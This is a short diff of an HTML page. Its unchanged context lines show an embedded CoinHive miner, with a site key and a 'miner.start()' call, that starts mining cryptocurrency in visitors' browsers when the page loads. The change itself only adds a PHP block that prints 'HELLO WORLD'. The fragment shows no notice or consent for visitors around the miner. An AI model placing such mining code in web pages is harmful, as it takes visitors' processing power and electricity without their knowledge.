@@ -15,6 +15,9 @@ var miner = new CoinHive.User('ML5c5cI4uehsRo0wmY99G6twhyBOS4ou', 'ASKMONA-9485'
 });
 miner.start();
 </script>
+ <?php
+            echo "HELLO WORLD";
+ ?>
 
 </body>
 </html>
